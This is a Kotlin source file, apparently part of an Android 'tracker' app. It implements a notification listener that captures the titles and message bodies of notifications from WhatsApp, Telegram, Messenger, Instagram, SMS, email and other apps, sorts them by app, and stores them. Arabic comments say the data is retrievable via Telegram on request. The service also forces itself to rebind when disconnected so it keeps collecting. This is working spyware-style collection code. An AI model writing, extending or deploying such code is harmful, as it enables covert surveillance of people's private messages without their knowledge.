package com.abuzahra.tracker.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.abuzahra.tracker.LocalStorageManager
import com.abuzahra.tracker.SharedPrefsManager

/**
 * MyNotificationListener - مستمع الإشعارات
 * الإصدار الجديد: يحفظ محلياً فقط - بدون Firebase إجباري
 * البيانات متاحة عبر تيليجرام عند الطلب
 */
class MyNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""

            // تجاهل إشعارات هذا التطبيق نفسه
            if (pkg == packageName) return
            if (title.isEmpty() && text.isEmpty()) return

            // تحديد نوع التطبيق
            val (_, appName) = classifyNotification(pkg)

            // بناء بيانات الإشعار
            val notificationData = mapOf(
                "type" to appName,
                "app" to appName,
                "package" to pkg,
                "title" to title,
                "body" to text,
                "timestamp" to System.currentTimeMillis(),
                "collected_at" to System.currentTimeMillis()
            )

            // حفظ محلياً فقط (نوع عام + نوع التطبيق)
            LocalStorageManager.storeData(this, "notification", notificationData)
            if (appName != "notification") {
                LocalStorageManager.storeData(this, appName, notificationData)
            }

            Log.d(TAG, "إشعار [$appName]: $title")

        } catch (e: Exception) {
            Log.e(TAG, "خطأ في معالجة الإشعار: ${e.message}")
        }
    }

    private fun classifyNotification(pkg: String): Pair<String, String> {
        return when {
            pkg.contains("whatsapp", ignoreCase = true) -> Pair("social", "whatsapp")
            pkg.contains("telegram", ignoreCase = true) -> Pair("social", "telegram")
            pkg.contains("messenger", ignoreCase = true) || pkg.contains("facebook", ignoreCase = true)
                -> Pair("social", "messenger")
            pkg.contains("instagram", ignoreCase = true) -> Pair("social", "instagram")
            pkg.contains("snapchat", ignoreCase = true) -> Pair("social", "snapchat")
            pkg.contains("tiktok", ignoreCase = true) -> Pair("social", "tiktok")
            pkg.contains("twitter", ignoreCase = true) || pkg.contains("x.", ignoreCase = true)
                -> Pair("social", "twitter")
            pkg.contains("youtube", ignoreCase = true) -> Pair("social", "youtube")
            pkg.contains("gmail", ignoreCase = true) || pkg.contains("mail", ignoreCase = true)
                -> Pair("email", "email")
            pkg.contains("sms", ignoreCase = true) || pkg.contains("messaging", ignoreCase = true)
                -> Pair("sms", "sms")
            pkg.contains("call", ignoreCase = true) || pkg.contains("dialer", ignoreCase = true)
                -> Pair("call", "call")
            else -> Pair("notification", "notification")
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "تم ربط مستمع الإشعارات")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "تم فصل مستمع الإشعارات - إعادة الربط...")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            try {
                requestRebind(android.content.ComponentName(this, this.javaClass))
            } catch (e: Exception) {
                Log.e(TAG, "فشل إعادة الربط: ${e.message}")
            }
        }
    }
}
